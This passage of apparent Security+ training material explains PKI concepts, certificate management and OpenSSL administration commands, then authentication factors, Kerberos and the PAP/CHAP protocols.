- Provide a range of certificate services useful to the community of users serviced by the CA.
- Ensure the validity of certificates and the identity of those applying for them (registration).
- Establish trust in the CA by users and government and regulatory authorities and enterprises, such as financial institutions.
- Manage the servers (repositories) that store and administer the certificates.
- Perform key and certificate lifecycle management, notably revoking invalid certificates.

PKI TRUST MODELS

The trust model is a critical PKI concept, and shows how users and different CAs are able to trust one another.
### Single CA
In this simple model, a single CA issues certificates to users; users trust certificates issued by that CA and no other. The problem with this approach is that the single CA server is very exposed. If it is compromised, the whole PKI collapses.
### Hierarchical (Intermediate CA)
In the hierarchical model, a single CA (called the root) issues certificates to several intermediate CAs. The intermediate CAs issue certificates to subjects (leaf or end entities). This model has the advantage that different intermediate CAs can be set up with different certificate policies, enabling users to perceive clearly what a particular certificate is designed for. Each leaf certificate can be traced back to the root CA along the certification path. This is also referred to as certificate chaining, or a chain of trust. The root's certificate is self-signed. In the hierarchical model, the root is still a single point of failure. If the root is damaged or compromised, the whole structure collapses. To mitigate against this, however, the root server can be taken offline, as most of the regular CA activities are handled by the intermediate CA servers.

Another problem is that there is limited opportunity for cross-certification; that is, to trust the CA of another organization. Two organizations could agree to share a root CA, but this would lead to operational difficulties that could only increase as more organizations join. In practice, most clients are configured to trust multiple root CAs.
### Online versus Offline CAs
An online CA is one that is available to accept and process certificate signing requests, publish certificate revocation lists, and perform other certificate management tasks. Because of the high risk posed by compromising the root CA, a secure configuration involves making the root an offline CA. This means that it is disconnected from any network and usually kept in a powered-down state. The root CA will need to be brought online to add or update intermediate CAs.

REGISTRATION AUTHORITIES AND CSRS

Registration is the process by which end users create an account with the CA and become authorized to request certificates. The exact processes by which users are authorized and their identity proven are determined by the CA implementation. 

Commercial CAs might perform a range of tests to ensure that a subject is who he or she claims to be. It is in the CA's interest to ensure that it only issues certificates to legitimate users, or its reputation will suffer.

On a private network (such as a Windows domain), the right to issue certificates of different types must be carefully controlled. The Windows CA supports access permissions for each certificate type so that you can choose which accounts are able to issue them.

When a subject wants to obtain a certificate, it completes a certificate signing request (CSR) and submits it to the CA. The CSR is a Base64 ASCII file containing the information that the subject wants to use in the certificate, including its public key.

The CA reviews the certificate and checks that the information is valid. For a web server, this may simply mean verifying that the subject name and fully qualified domain name (FQDN) are identical, and verifying that the CSR was initiated by the person administratively responsible for the domain, as identified in the domain's WHOIS records. If the request is accepted, the CA signs the certificate and sends it to the subject.

The registration function may be delegated by the CA to one or more registration authorities (RAs). These entities complete identity checking and submit CSRs on behalf of end users, but they do not actually sign or issue certificates.

DIGITAL CERTIFICATES

A digital certificate is essentially a wrapper for a subject's public key. As well as the public key, it contains information about the subject and the certificate's issuer or guarantor. The certificate is digitally signed to prove that it was issued to the subject by a particular CA. The subject could be a human user (for certificates allowing the signing of messages, for instance) or a computer server (for a web server hosting confidential transactions, for instance).

Digital certificates are based on the X.509 standard approved by the International Telecommunications Union and standardized by the Internet Engineering Taskforce (<https://datatracker.ietf.org/doc/html/rfc5208>). The Public Key Infrastructure X.509 (PKIX) working group manages the development of these standards. RSA also created a set of standards, referred to as Public Key Cryptography Standards (PKCS), to promote the use of public key infrastructure.

CERTIFICATE ATTRIBUTES

The X.509 standard defines the fields or attributes that must be present in the certificate.

- Serial number: A number uniquely identifying the certificate within the domain of its CA. 
- Signature algorithm: The algorithm used by the CA to sign the certificate.
- Issuer: The name of the CA. 
- Valid from/to: Date and time during which the certificate is valid.
- Subject: The name of the certificate holder, expressed as a distinguished name (DN). Within this, the common name (CN) part should usually match either the fully qualified domain name (FQDN) of the server or a user email address.
- Public key: Public key and algorithm used by the certificate holder.
- Extensions: V3 certificates can be defined with extended attributes, such as friendly subject or issuer names, contact email addresses, and intended key usage. 
- Subject alternative name (SAN): This extension field is the preferred mechanism to specify additional host names for a single certificate.

SUBJECT NAME ATTRIBUTES

When certificates were first introduced, the common name (CN) attribute was used to identify the FQDN by which the server is accessed, such as www.comptia.org. This usage grew by custom rather than design, however. The CN attribute can contain different kinds of information, making it difficult for a browser to interpret it correctly. Consequently, the CN attribute is deprecated as a method of validating subject identity ([tools.ietf.org/html/rfc2818#section-3.1](https://tools.ietf.org/html/rfc2818#section-3.1)).

The subject alternative name (SAN) extension field is structured to represent different types of identifiers, including domain names. If a certificate is configured with a SAN, the browser should validate that, and ignore the CN value. It is still safer to put the FQDN in the CN as well, because not all browsers and implementations stay up to date with the standards.

The SAN field also allows a certificate to represent different subdomains, such as www.comptia.org and members.comptia.org.

Listing the specific subdomains is more secure, but if a new subdomain is added, a new certificate must be issued. A wildcard domain, such as \*.comptia.org, means that the certificate issued to the parent domain will be accepted as valid for all subdomains (to a single level).

TYPES OF CERTIFICATE 

Certificate policies define the different uses of certificate types issued by the CA. These can be configured as standard certificate templates.

A certificate type is set by configuring the Key Usage attribute. The Extended Key Usage (EKU) field—referred to by Microsoft as Enhanced Key Usage—is a complementary means of defining usage. Typical values used include Server Authentication, Client Authentication, Code Signing, or Email Protection. The EKU field is more flexible than the Key Usage field, but problems can occur when nonstandard or vendor-specific definitions are used.

An extension can be tagged as critical, meaning that the application processing the certificate must be able to interpret the extension correctly; otherwise, the certificate should be rejected. In the case of a Key Usage extension marked as critical, an application should reject the certificate if it cannot resolve the Key Usage value. 

WEB SERVER CERTIFICATE TYPES

A server certificate guarantees the identity of e-commerce sites or any sort of website to which users submit data that should be kept confidential. One of the problems with public key cryptography and trust models is that anyone can set up a PKI solution. It is also simple to register convincing-sounding domain names, such as my-bank-server.foo, where the "real" domain is mybank.foo. If users choose to trust a certificate in the naïve belief that simply having a certificate makes a site trustworthy, they could expose themselves to fraud. There have also been cases of disreputable sites obtaining certificates from third-party CAs that are automatically trusted by browsers that apparently validate their identities as financial institutions.

Differently graded certificates might be used to provide levels of security; for example, an online bank requires higher security than a site that collects marketing data.

- Domain Validation (DV)—proving the ownership of a particular domain. This may be proved by responding to an email to the authorized domain contact or by publishing a txt record to the domain. This process can be highly vulnerable to compromise. 
- Extended Validation (EV)—subjecting to a process that requires more rigorous checks on the subject's legal identity and control over the domain or software being signed. EV standards are maintained by the CA/Browser forum ([cabforum.org](https://cabforum.org/)). An EV certificate cannot be issued for a wildcard domain.

OTHER CERTIFICATE TYPES

Web servers are not the only systems that need to validate identity. There are many other certificate types, designed for different purposes.
### Machine/Computer Certificates
It might be necessary to issue certificates to machines (servers, PCs, smartphones, and tablets), regardless of function. For example, in an Active Directory domain, machine certificates could be issued to Domain Controllers, member servers, or even client workstations. Machines without valid domain-issued certificates could be prevented from accessing network resources. Machine certificates might be issued to network appliances, such as routers, switches, and firewalls. The SAN and often the CN attribute should be set to the FQDN of the machine (host name and local domain part).
### Email/User Certificates
An email certificate can be used to sign and encrypt email messages, typically using Secure Multipart Internet Message Extensions (S/MIME) or Pretty Good Privacy (PGP). The user's email address must be entered as the SAN and CN. On a directory-based local network, such as Windows Active Directory, there may be a need for a wider range of user certificate types. For example, in AD there are user certificate templates for standard users, administrators, smart card logon/users, recovery agent users, and Exchange mail users (with separate templates for signature and encryption). Each certificate template has different key usage definitions.
### Code Signing Certificates
A code signing certificate is issued to a software publisher, following some sort of identity check and validation process by the CA. The publisher then signs the executables or DLLs that make up the program to guarantee the validity of a software application or browser plug-in. Some types of scripting environments, such as PowerShell, can also require valid digital signatures. The CN is set to an organization name, such as "CompTIA Development Services, LLC," rather than an FQDN.
### Root Certificate
The root certificate is the one that identifies the CA itself. The root certificate is self-signed. A root certificate would normally use a key size of at least 2048 bits. Many providers are switching to 4096 bits. The CN for a root certificate is set to the organization/CA name, such as "CompTIA Root CA," rather than an FQDN.
### Self-signed Certificates
Any machine, web server, or program code can be deployed with a self-signed certificate. Self-signed certificates will be marked as untrusted by the operating system or browser, but an administrative user can choose to override this.

Topic 6B: Implement PKI Management

CERTIFICATE AND KEY MANAGEMENT 

Key management refers to operational considerations for the various stages in a key's life cycle. A key's life cycle may involve the following stages:

- Key generation—creating a secure key pair of the required strength, using the chosen cipher.
- Certificate generation—to identify the public part of a key pair as belonging to a subject (user or computer), the subject submits it for signing by the CA as a digital certificate with the appropriate key usage. At this point, it is critical to verify the identity of the subject requesting the certificate and only issue it if the subject passes identity checks.
- Storage—the user must take steps to store the private key securely, ensuring that unauthorized access and use is prevented. It is also important to ensure that the private key is not lost or damaged.
- Revocation—if a private key is compromised, the key pair can be revoked to prevent users from trusting the public key.
- Expiration and renewal—a key pair that has not been revoked expires after a certain period. Giving the key or certificate a "shelf-life" increases security. Certificates can be renewed with new key material.

Key management can be centralized, meaning that one administrator or authority controls the process, or decentralized, in which each user is responsible for his or her keys.

KEY RECOVERY AND ESCROW 

Keys such as the private key of a root CA must be subject to the highest possible technical and procedural access controls. If such a key were compromised, it would put the confidentiality and integrity of data processed by hundreds or thousands of systems at risk. Access to such critical encryption keys must be logged and audited and is typically subject to M-of-N control, meaning that of N number of administrators permitted to access the system, M must be present for access to be granted. M must be greater than 1, and N must be greater than M. For example, when M = 2 and N = 4, any two of four administrators must be present. Staff authorized to perform key management must be carefully vetted, and due care should be taken if these employees leave the business.

Another way to use M-of-N control is to split a key between several storage devices (such as three USB sticks, any two of which could be used to recreate the full key).

If the key used to decrypt data is lost or damaged, the encrypted data cannot be recovered unless a backup of the key has been made. A significant problem with key storage is that if you make multiple backups of a key, it is exponentially more difficult to ensure that the key is not compromised. However, if the key is not backed up, the storage system represents a single point of failure. Key recovery defines a secure process for backing up keys and/or recovering data encrypted with a lost key. This process might use M-of-N control to prevent unauthorized access to (and use of) the archived keys. Escrow means that something is held independently. In terms of key management, this refers to archiving a key (or keys) with a third party. This is a useful solution for organizations that don't have the capability to store keys securely themselves, but it invests a great deal of trust in the third party.

CERTIFICATE EXPIRATION

Certificates are issued with a limited duration, as set by the CA policy for the certificate type. Root certificates might have long expiration dates (10+ years), whereas web server and user certificates might be issued for 1 year only. Typically, a certificate is renewed before it expires. Where a user is in possession of a valid certificate, less administration is required (in terms of checking identity) than with a request for a new certificate. When you are renewing a certificate, it is possible to use the existing key (referred to specifically as certificate renewal) or generate a new key (the certificate is rekeyed). A new key might be generated if the old one was no longer considered long enough or if any compromise of the key was feared.

When a certificate expires, there is the question of what to do with the key pair that it represents. A key can either be archived or destroyed. Destroying the key offers more security, but has the drawback that any data encrypted using the key will be unreadable. Whether a key is archived or destroyed will largely depend on how the key was used. In software terms, a key can be destroyed by overwriting the data (merely deleting the data is not secure). A key stored on hardware can be destroyed by a specified erase procedure or by destroying the device. 

CERTIFICATE REVOCATION LISTS

A certificate may be revoked or suspended:

- A revoked certificate is no longer valid and cannot be "un-revoked" or reinstated.
- A suspended certificate can be re-enabled.

A certificate may be revoked or suspended by the owner or by the CA for many reasons. For example, the certificate or its private key may have been compromised, the business could have closed, a user could have left the company, a domain name could have been changed, the certificate could have been misused in some way, and so on. These reasons are codified under choices such as Unspecified, Key Compromise, CA Compromise, Superseded, or Cessation of Operation. A suspended key is given the code Certificate Hold. 

It follows that there must be some mechanism for informing users whether a certificate is valid, revoked, or suspended. CAs must maintain a certificate revocation list (CRL) of all revoked and suspended certificates, which can be distributed throughout the hierarchy. 

A CRL has the following attributes:

- Publish period—the date and time on which the CRL is published. Most CAs are set up to publish the CRL automatically.
- Distribution point(s)—the location(s) to which the CRL is published.
- Validity period—the period during which the CRL is considered authoritative. This is usually a bit longer than the publish period (for example, if the publish period was every 24 hours, the validity period might be 25 hours).
- Signature—the CRL is signed by the CA to verify its authenticity.

With the CRL system, there is a risk that the certificate might be revoked but still accepted by clients because an up-to-date CRL has not been published. A further problem is that the browser (or other application) may not be configured to perform CRL checking, although this now tends to be the case only with legacy browser software.

ONLINE CERTIFICATE STATUS PROTOCOL RESPONDERS

Another means of providing up-to-date information is to check the certificate's status on an Online Certificate Status Protocol (OCSP) server, referred to as an OCSP responder. Rather than return a whole CRL, this just communicates the status of the requested certificate. Details of the OCSP responder service should be published in the certificate.

Most OCSP servers can query the certificate database directly and obtain the real-time status of a certificate. Other OCSP servers actually depend on the CRLs and are limited by the CRL publishing interval.

One of the problems with OCSP is that the job of responding to requests is resource intensive and can place high demands on the issuing CA running the OCSP responder. There is also a privacy issue, as the OCSP responder could be used to monitor and record client browser requests. OCSP stapling resolves these issues by having the SSL/TLS web server periodically obtain a time-stamped OCSP response from the CA. When a client submits an OCSP request, the web server returns the time-stamped response, rather than making the client contact the OCSP responder itself.

CERTIFICATE PINNING

When certificates are used by a transport protocol, such as SSL/TLS, there is a possibility that the chain of trust among the client, the server, and whatever intermediate and root CAs have provided certificates can be compromised. If an adversary can substitute a malicious but trusted certificate into the chain (using some sort of proxy or Man-in-the-Middle attack), they could be able to snoop on the supposedly secure connection.

Pinning refers to several techniques to ensure that when a client inspects the certificate presented by a server or a code-signed application, it is inspecting the proper certificate. This might be achieved by embedding the certificate data in the application code, or by submitting one or more public keys to an HTTP browser via an HTTP header, which is referred to as HTTP Public Key Pinning (HPKP).

CERTIFICATE FORMATS

There are various formats for encoding a certificate as a digital file for exchange between different systems. 
### Encoding
Cryptographic data—both certificates and keys—are processed as binary using Distinguished Encoding Rules (DER). Binary format files are not commonly used, however.

More typically, the binary data is represented as ASCII text characters using Base64 Privacy-enhanced Electronic Mail (PEM) encoding. ASCII-format data has descriptive headers, such as the "BEGIN CERTIFICATE" string.
### File Extensions
A three character file extension is a convention, not a standard, and unfortunately file extensions do not always map cleanly to the type of encoding used within a certificate file, or even to the contents of a certificate file. The only certain way to check is to open it in a text editor.

- Both .DER and .PEM can be used as file extensions, although the latter is not recognized by Windows. .PEM is the most widely used extension for ASCII format files in Linux.
- The .CRT and .CER extensions can also be used, but they are not well-standardized. Most of the confusion arises from the way Windows handles certificates. In Linux, .CRT is most likely to represent an ASCII certificate. In Windows, the most common extension is .CER, but this does not tell you whether the file format is binary or ASCII.
### Contents
A certificate file can also contain more than just a single certificate:

- The PKCS #12 format allows the export of the private key with the certificate. This would be used either to transfer a private key to a host that could not generate its own keys, or to back up/archive a private key. This type of file format is usually password-protected and always binary. On Windows, these usually have a .PFX extension, while MacOS and iOS use .P12. In Linux, the certificate and key are usually stored in separate files.
- The P7B format implements PKCS #7, which is a means of bundling multiple certificates in the same file. It is typically in ASCII format. This is most often used to deliver a chain of certificates that must be trusted by the processing host. It is associated with the use of S/MIME to encrypt email messages. P7B files do not contain the private key. In Linux, the .PEM extension is very widely used for certificate chains.

OPENSSL

In a Windows environment, certificate infrastructure is installed and managed as Active Directory Certificate Services. There is a certutil tool for command line management, or you can use PowerShell.

For Linux, CA services are typically implemented using the OpenSSL suite ([openssl.org](https://www.openssl.org/)). The following represent a few of the many operations that can be accomplished using openssl commands.
### Root CA
To configure a root CA in OpenSSL, set up a directory structure and adapt an OpenSSL configuration file (openssl.cnf) for any site-local settings. You then need to create an RSA key pair:

openssl genrsa -aes256 -out cakey.pem 4096

The -aes256 argument encrypts the key and requires a password to make use of it. The 4096 argument sets the key length. The output file data is in PEM ASCII format by default. Some sites prefer a naming convention, such as ca.key.

The next step is to use this RSA key pair to generate a self-signed root X.509 digital certificate:

openssl req -config openssl.cnf -key cakey.pem -new -x509 -days 7300 -sha256 -out cacert.pem

This example is simplified. Using a root CA to issue leaf certificates directly is not robust. It is better to create one or more intermediate CAs.
### Certificate Signing Requests
To configure a certificate on a host, create a certificate signing request (CSR) with a new key pair. This command is run on the web server:

openssl req -nodes -new -newkey rsa:2048 -out www.csr -keyout www.key

Having run the command, you then complete the prompts to enter the subject information for the certificate, taking care to match the common name (CN) to the FQDN by which clients access the server. This key is created without a password, which would have to be input at any restart of the web server application. We can rely on general access control security measures to protect the key.

This CSR file must then be transmitted to the CA server. On the CA, run the following command to sign the CSR and output the X.509 certificate:

openssl ca -config openssl.cnf -extensions webserver -infiles www.csr -out www.pem

The passphrase must be entered to confirm use of the cakey.pem private key. The -extensions argument selects an area of the configuration file for a particular certificate type. This sets the key usage attribute, plus any other extended attributes that are needed.

You can view the new certificate to check the details using the following two commands:

openssl x509 -noout -text -in www.pem

openssl verify -verbose -cafile cacert.pem www.pem

Transmit the www.pem file to the web server and update the server configuration to use it and the www.key private key.
### Key and Certificate Management 
You might export a copy of the private key from this server to be held in escrow as a backup. For this usage, you must password-protect the key:

openssl rsa -aes256 -in www.key -out www.key.bak

You might need to convert the certificate format to make it compatible with an application server, such as Java. The following command takes a PEM-encoded certificate and outputs a DER binary-encoded certificate:

openssl x509 -outform der -in www.pem -out www.der

Another use case is to export a key and certificate for use in Windows:

openssl pkcs12 -export -inkey www.key -in www.pem -out www.pfx

CERTIFICATE ISSUES

The most common problem when dealing with certificate issues is that of a client rejecting a server certificate (or slightly less commonly, an authentication server rejecting a client's certificate). 

- If the problem is with an existing certificate that has been working previously, check that the certificate has not expired or been revoked or suspended. 
- If the problem is with a new certificate, check that the key usage settings are appropriate for the application. Some clients, such as VPN and email clients, have very specific requirements for key usage configuration. Also, check that the subject name is correctly configured and that the client is using the correct address. For example, if a client tries to connect to a server by IP address instead of FQDN, a certificate configured with an FQDN will be rejected. 
- If troubleshooting a new certificate that is correctly configured, check that clients have been configured with the appropriate chain of trust. You need to install root and intermediate CA certificates on the client before a leaf certificate can be trusted. Be aware that some client applications might maintain a different certificate store to that of the OS. 
- In either case, verify that the time and date settings on the server and client are synchronized. Incorrect date/time settings are a common cause of certificate problems. 

From a security point of view, you must also audit certificate infrastructure to ensure that only valid certificates are being issued and trusted. Review logs of issued certificates periodically. Validate the permissions of users assigned to manage certificate services. Check clients to ensure that only valid root CA certificates are trusted. Make sure clients are checking for revoked or suspended certificates. 

Lesson 7: Implementing Authentication Controls

Each network user and host device must be identified with an account so that you can control their access to your organization's applications, data, and services. The processes that support this requirement are referred to as identity and access management (IAM). Within IAM, authentication technologies ensure that only valid subjects (users or devices) can operate an account. Authentication requires the account holder to submit credentials that should only be known or held by them in order to access the account.

Topic 7A: summarize Authentication Design Concepts

Strong authentication is the first line of defense in the battle to secure network resources. But authentication is not a single process; there are many different methods and mechanisms, some of which can be combined to form more effective products.

IDENTITY AND ACCESS MANAGEMENT 

An access control system is the set of technical controls that govern how subjects may interact with objects. Subjects in this sense are users, devices, or software processes, or anything else that can request and be granted access to a resource. Objects are the resources; these could be networks, servers, databases, files, and so on. An identity and access management (IAM) system is usually described in terms of four main processes: 

- Identification—creating an account or ID that uniquely represents the user, device, or process on the network. 
- Authentication—proving that a subject is who or what it claims to be when it attempts to access the resource. 
- Authorization—determining what rights subjects should have on each resource, and enforcing those rights. 
- Accounting—tracking authorized usage of a resource or use of rights by a subject and alerting when unauthorized use is detected or attempted. 

IAM enables you to define the attributes that make up an entity's identity, such as its purpose, function, security clearance, and more. These attributes subsequently enable access management systems to make informed decisions about whether to grant or deny an entity access, and if granted, decide what the entity has authorization to do.


- Identification—ensure that customers are legitimate. For example, you might need to ensure that billing and delivery addresses match and that they are not trying to use fraudulent payment methods. 
- Authentication—ensure that customers have unique accounts and that only they can manage their orders and billing information. 
- Authorization—rules to ensure customers can place orders only when they have valid payment mechanisms in place. You might operate loyalty schemes or promotions that authorize certain customers to view unique offers or content. 
- Accounting—the system must record the actions a customer takes (to ensure that they cannot deny placing an order, for instance). 

The servers and protocols that implement these functions are referred to as authentication, authorization, and accounting (AAA). The use of IAM to describe enterprise processes and workflows is becoming more prevalent as the importance of the identification phase is better acknowledged. 

AUTHENTICATION FACTORS 

Assuming that an account has been created securely (the identity of the account holder has been verified), authentication verifies that only the account holder is able to use the account, and that the system may only be used by account holders. Authentication is performed when the account holder supplies the appropriate credentials (or authenticators) to the system. These are compared to the credentials stored on the system. If they match, the account is authenticated. 

There are many different technologies for defining credentials and can be categorized as factors. 
### Something You Know Authentication
The typical knowledge factor is the logon, composed of a username and a password. The username is typically not a secret (although it should not be published openly), but the password must be known only to the account holder. A passphrase is a longer password composed of several words. This has the advantages of being more secure and easier to remember. A personal identification number (PIN) is also something you know, although long PIN codes are hard to remember, and short codes are too vulnerable for most authentication systems. Swipe patterns are often used for authentication to touch-based devices.

A knowledge factor is also used for account reset mechanisms. For example, to reset the password on an account, the user might have to respond to a challenge question, such as, "What is your favorite movie?"
### Something You Have Authentication
An ownership factor means that the account holder possesses something that no one else does, such as a smart card, fob, or wristband programmed with a unique identity certificate or account number. Alternatively, they might have a USB fob that generates a unique code. These ownership factors can be described as hard tokens.

A device such as a smartphone can also be used to receive a uniquely generated access code as a soft token. Unlike a password, these tokens are valid for only one use, typically within a brief time window.
### Something You Are/Do Authentication
A biometric factor uses either physiological identifiers, such as a fingerprint, or behavioral identifiers, such as the way someone moves (gait). The identifiers are scanned and recorded as a template. When the user authenticates, another scan is taken and compared to the template.

AUTHENTICATION DESIGN 

Authentication design refers to selecting a technology that meets requirements for confidentiality, integrity, and availability:

- Confidentiality, in terms of authentication, is critical, because if account credentials are leaked, threat actors can impersonate the account holder and act on the system with whatever rights they have.
- Integrity means that the authentication mechanism is reliable and not easy for threat actors to bypass or trick with counterfeit credentials.
- Availability means that the time taken to authenticate does not impede workflows and is easy enough for users to operate.

Authentication is used in different contexts and factors are not always well-suited to a context. For example, you might authenticate to a PC by inputting a password to get access to the device. This might also authenticate you to a network. But authentication is also used for physical security. If you consider numerous employees arriving for work, asking them to type a password to gain access to the building would take too long and cause huge disruption (lack of availability). It is also highly likely that passwords would be observed (lack of confidentiality). Finally, it is likely that users would simply start holding the door open for each other (lack of integrity). Authentication design tries to anticipate these issues and implements a technology that fits the use case.

MULTIFACTOR AUTHENTICATION 

An authentication technology is considered strong if it combines the use of more than one type of knowledge, ownership, and biometric factor, and is called multifactor authentication (MFA). Single-factor authentication can quite easily be compromised: a password could be written down or shared, a smart card could be lost or stolen, and a biometric system could be subject to high error rates or spoofing.

Two-Factor Authentication (2FA) combines either an ownership-based smart card or biometric identifier with something you know, such as a password or PIN. Three-factor authentication combines all three technologies, or incorporates an additional attribute, such as location; for example, a smart card with integrated fingerprint reader. This means that to authenticate, the user must possess the card, the user's fingerprint must match the template stored on the card, and the user must input a PIN or password.

AUTHENTICATION ATTRIBUTES

Compared to the three main authentication factors, an authentication attribute is either a non-unique property or a factor that cannot be used independently. 
### Somewhere You Are Authentication
Location-based authentication measures some statistic about where you are. This could be a geographic location, measured using a device's location service, or it could be by IP address. A device's IP address could be used to refer to a logical network segment, or it could be linked to a geographic location using a geolocation service. Within a premises network, the physical port location, virtual LAN (VLAN), or Wi-Fi network can also be made the basis of location-based authentication.

Location-based authentication is not used as a primary authentication factor, but it may be used as a continuous authentication mechanism or as an access control feature. For example, if a user enters the correct credentials at a VPN gateway but his or her IP address shows him/her to be in a different country than expected, access controls might be applied to restrict the privileges granted or refuse access completely. Another example is where a user appears to login from different geographic locations that travel time would make physically impossible.
### Something You Can Do Authentication
Behavioral characteristics, such as the way you walk or the way you hold your smartphone, can uniquely identify you to a considerable degree of accuracy. Although this factor is impractical to use for primary authentication, it can be used for contextual and continual authentication to ensure that a device continues to be operated by the owner.
### Something You Exhibit Authentication
Something you exhibit also refers to behavioral-based authentication and authorization, with specific emphasis on personality traits. For example, the way you use smartphone apps or web search engines might conform to a pattern of behavior that can be captured by machine learning analysis as a statistical template. If someone else uses the device, their behavior will be different, and this anomalous pattern could be used to lock the device and require reauthentication.
### Someone You Know Authentication
A someone you know authentication scheme uses a web of trust model, where new users are vouched for by existing users. As the user participates in the network, their identity becomes better established. One example is the decentralized web of trust model, used by Pretty Good Privacy (PGP) as an alternative to PKI ([weboftrust.info/index.html](https://www.weboftrust.info/index.html)).

Topic 7B: Implement Knowledge-Based Authentication

Knowledge-based authentication refers primarily to issuing users with password-based account access mechanisms. Configuring password-based authentication protocols and supporting users with authentication issues is an important part of the information security role.

LOCAL, NETWORK, AND REMOTE AUTHENTICATION

One of the most important features of an operating system is the authentication provider, which is the software architecture and code that underpins the mechanism by which the user is authenticated before starting a shell. This is usually described as a login (Linux) or a logon or sign-in (Microsoft). Knowledge-based authentication, using a password or personal identification number (PIN), is the default authentication provider for most operating systems.

Knowledge-based authentication relies on cryptographic hashes. A plaintext password is not usually transmitted or stored in a credential database because of the risk of compromise. Instead, the password is stored as a cryptographic hash. When a user enters a password to log in, an authenticator converts what is typed into a hash and transmits that to an authority. The authority compares the submitted hash to the one in the database and authenticates the subject only if they match.
### Windows Authentication
Windows authentication involves a complex architecture of components ([docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication](https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication)), but the following three scenarios are typical:

- Windows local sign-in—the Local Security Authority (LSA) compares the submitted credential to a hash stored in the Security Accounts Manager (SAM) database, which is part of the registry. This is also referred to as interactive logon.
- Windows network sign-in—the LSA can pass the credentials for authentication to a network service. The preferred system for network authentication is based on Kerberos, but legacy network applications might use NT LAN Manager (NTLM) authentication.
- Remote sign-in—if the user's device is not connected to the local network, authentication can take place over some type of virtual private network (VPN) or web portal.
### Linux Authentication
In Linux, local user account names are stored in /etc/passwd. When a user logs in to a local interactive shell, the password is checked against a hash stored in /etc/shadow. Interactive login over a network is typically accomplished using Secure Shell (SSH). With SSH, the user can be authenticated using cryptographic keys instead of a password.

A pluggable authentication module (PAM) is a package for enabling different authentication providers, such as smart-card login ([tecmint.com/configure-pam-in-centos-ubuntu-linux](https://www.tecmint.com/configure-pam-in-centos-ubuntu-linux/)). The PAM framework can also be used to implement authentication to network servers.
### Single Sign-On (SSO)
A single sign-on (SSO) system allows the user to authenticate once to a local device and be authenticated to compatible application servers without having to enter credentials again. In Windows, SSO is provided by the Kerberos framework.

KERBEROS AUTHENTICATION

Kerberos is a single sign-on network authentication and authorization protocol used on many networks, notably as implemented by Microsoft's Active Directory (AD) service. Kerberos was named after the three-headed guard dog of Hades (Cerberus) because it consists of three parts. Clients request services from application servers, which both rely on an intermediary—a Key Distribution Center (KDC)—to vouch for their identity. There are two services that make up a KDC: the Authentication Service and the Ticket Granting Service. The KDC runs on port 88 using TCP or UDP.

The Authentication Service is responsible for authenticating user logon requests. More generally, users and services can be authenticated; these are collectively referred to as principals. For example, when you sit at a Windows domain workstation and log on to a realm (or domain), the first step of logon is to authenticate with a KDC server, implemented as a domain controller.

1. The client sends the authentication service (AS) a request for a Ticket Granting Ticket (TGT). This is composed by encrypting the date and time on the local computer with the user's password hash as the key. 

The password hash itself is not transmitted over the network. Also, although we refer to passwords for simplicity, the system can use other authentication providers, such as smart-card logon.

The Ticket Granting Ticket (TGT; or user ticket) is time-stamped (under Windows, they have a default maximum age of 10 hours). This means that workstations and servers on the network must be synchronized (to within five minutes) or a ticket will be rejected. This helps prevent replay attacks.

2. The AS checks that the user account is present, that it can decode the request by matching the user's password hash with the one in the Active Directory database, and that the request has not expired. If the request is valid, the AS responds with the following data:
- Ticket Granting Ticket (TGT)—this contains information about the client (name and IP address) plus a timestamp and validity period. This is encrypted using the KDC's secret key.
- TGS session key for use in communications between the client and the Ticket Granting Service (TGS). This is encrypted using a hash of the user's password.

The TGT is an example of a logical token. All the TGT does is identify who you are and confirm that you have been authenticated—it does not provide you with access to any domain resources.

KERBEROS AUTHORIZATION 

Presuming the user entered the correct password, the client can decrypt the Ticket Granting Service (TGS) session key but not the TGT. This establishes that the client and KDC know the same shared secret and that the client cannot interfere with the TGT.

1. To access resources within the domain, the client requests a Service Ticket (a token that grants access to a target application server). This process of granting service tickets is handled by the TGS.
1. The client sends the TGS a copy of its TGT and the name of the application server it wishes to access plus an authenticator, consisting of a time-stamped client ID encrypted using the TGS session key.

   The TGS should be able to decrypt both messages using the KDC's secret key for the first and the TGS session key for the second. This confirms that the request is genuine. It also checks that the ticket has not expired and has not been used before (replay attack).
1. The TGS service responds with:
- Service session key—for use between the client and the application server. This is encrypted with the TGS session key.
- Service ticket—containing information about the user, such as a timestamp, system IP address, Security Identifier (SID) and the SIDs of groups to which he or she belongs, and the service session key. This is encrypted using the application server's secret key.
- The client forwards the service ticket, which it cannot decrypt, to the application server and adds another time-stamped authenticator, which is encrypted using the service session key.
5. The application server decrypts the service ticket to obtain the service session key using its secret key, confirming that the client has sent an untampered message. It then decrypts the authenticator using the service session key.
5. Optionally, the application server responds to the client with the timestamp used in the authenticator, which is encrypted by using the service session key. The client decrypts the timestamp and verifies that it matches the value already sent, and concludes that the application server is trustworthy.

   This means that the server is authenticated to the client (referred to as mutual authentication). This prevents a man-in-the-middle attack, where a malicious user could intercept communications between the client and server.
5. The server now responds to client requests (assuming they conform to the server's access control list).

The data transfer itself is not encrypted (at least as part of Kerberos; some sort of transport encryption can be deployed).

One of the noted drawbacks of Kerberos is that the KDC represents a single point-of-failure for the network. In practice, backup KDC servers can be implemented (for example, Active Directory supports multiple domain controllers, each of which are running the KDC service).

PAP, CHAP, AND MS-CHAP AUTHENTICATION

Kerberos is designed to work over a trusted local network. Several authentication protocols have been developed to work with remote access protocols, where the connection is made over a serial link or virtual private network (VPN).
### Password Authentication Protocol (PAP)
The Password Authentication Protocol (PAP) is an unsophisticated authentication method developed as part of the Point-to-Point Protocol (PPP), used to transfer TCP/IP data over serial or dial-up connections. It is also used as the basic authentication mechanism in HTTP. It relies on clear text password exchange and is therefore obsolete for most purposes, except through an encrypted tunnel.
### Challenge Handshake Authentication Protocol (CHAP)
The Challenge Handshake Authentication Protocol (CHAP) was also developed as part of PPP as a means of authenticating users over a remote link. CHAP relies on an encrypted challenge in a system called a three-way handshake.

1. Challenge—the server challenges the client, sending a randomly generated challenge message.
1. Response—the client responds with a hash calculated from the server challenge message and client password (or other shared secret).
1. Verification—the server performs its own hash using the password hash stored for the client. If it matches the response, then access is granted; otherwise, the connection is dropped.

The handshake is repeated with a different challenge message periodically during the connection (although transparent to the user). This guards against replay attacks, in which a previous session could be captured and reused to gain access.

